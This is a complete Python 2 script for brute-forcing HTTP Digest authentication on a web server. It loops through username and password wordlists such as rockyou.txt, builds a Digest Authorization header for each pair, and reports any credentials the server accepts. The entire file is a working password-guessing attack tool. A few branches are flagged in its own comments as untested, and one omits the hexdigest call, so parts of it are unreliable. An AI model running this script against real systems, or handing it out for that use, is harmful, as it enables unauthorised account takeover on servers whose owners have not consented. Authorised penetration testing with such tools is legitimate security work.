#!/usr/bin/env python
import requests
import re
from hashlib import md5
import argparse

def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("target", help="url to brute force (http://www.domain.com/path/)")
    parser.add_argument("userlist", help="path to a file that contains usernames (/usr/share/wordlists/users.txt)")
    parser.add_argument("passlist", help="path to a file that contains passwords (/usr/share/wordlists/rockyou.txt)")
    args = parser.parse_args()

    url = args.target
    user_file = args.userlist
    pass_file = args.passlist
    nc = "00000001"
    cnonce = "b9bba3388da204c4"
    HA1 = ''
    HA2 = ''
    nonce = ''
    qop = None
    realm = None
    algorithm = None
    digest_uri = ''    
    response = ''
    msg_counter = 0
    
    #ensure the url ends with '/'
    if url.endswith('/') is not True:
        url = url + '/'
    
    #get the url path
    digest_uri = url[url.find('/', 8):]            
    with open(user_file) as usernames: 
        for username in usernames:
            username = username.strip()
            with open(pass_file) as passwords:
                for password in passwords:                
                    password = password.strip()
                    msg_counter = (msg_counter + 1) % 20                    
                    resp = requests.get(url)
                
                    if realm == None:
                        m = re.search('(?: realm="(.*?)")', resp.headers['www-authenticate'])
                        realm = m.group(1).strip()
                    
                    if algorithm == None:
                        m = re.search('(?: algorithm=(.*?),)', resp.headers['www-authenticate'])
                        if (m != None):
                            algorithm = m.group(1).strip()
                        else:
                            algorithm = 'MD5'
                    
                    if qop == None:
                        m = re.search('(?: qop="(.*?)")', resp.headers['www-authenticate'])
                        if (m != None):
                            qop = m.group(1).strip()
                        else:
                            qop = 'unspecified'

                    m = re.search('(?: nonce="(.*?)")', resp.headers['www-authenticate'])
                    nonce = m.group(1).strip()     
                            
                    if algorithm == 'MD5':
                        HA1 = md5("%s:%s:%s" %(username, realm, password)).hexdigest()
                    else:
                        #this part was not tested - might not conform to RFC 2617
                        HA1 = md5("%s:%s:%s" %(username, realm, password)).hexdigest()
                        HA1 = md5("%s:%s:%s" % (HA1, nonce, cnonce)).hexdigest()
                    
                    if qop == 'auth' or qop == 'unspecified':
                        HA2 = md5("GET:%s" %(digest_uri)).hexdigest()
                    else:
                        #this part was not tested - might not conform to RFC 2617
                        HA2 = md5(resp.content).hexdigest()
                        HA2 = md5("GET:%s:%s" %(digest_uri, HA2)).hexdigest()
                    
                    if 'auth' in qop:
                        response = md5("%s:%s:%s:%s:%s:%s" %(HA1, nonce, nc, cnonce, qop, HA2)).hexdigest()
                    else:
                        response = md5("%s:%s:%s" %(HA1, nonce, HA2))
                    
                    AuthHeader = 'Digest username="%s", realm="%s", nonce="%s", uri="%s", algorithm=%s, response="%s", nc=%s, cnonce="%s"'%(username, realm, nonce, digest_uri, algorithm, response, nc, cnonce)
                    if qop == 'unspecified':
                        AuthHeader = AuthHeader + ', qop=auth'
                    else:
                        AuthHeader = AuthHeader + ', qop=%s' %(qop)
                
                    headers = {'Authorization' : AuthHeader}
                    resp = requests.get(url, headers=headers)
                    if resp.status_code == requests.codes.ok:
                        print '[+] Found credentials - %s:%s' %(username, password)  
                        return
                    
                    if msg_counter == 0:
                        print '[-] Trying - %s:%s' %(username, password)

    print '[-] Brute force completed.'            

if __name__ == "__main__":
    main()
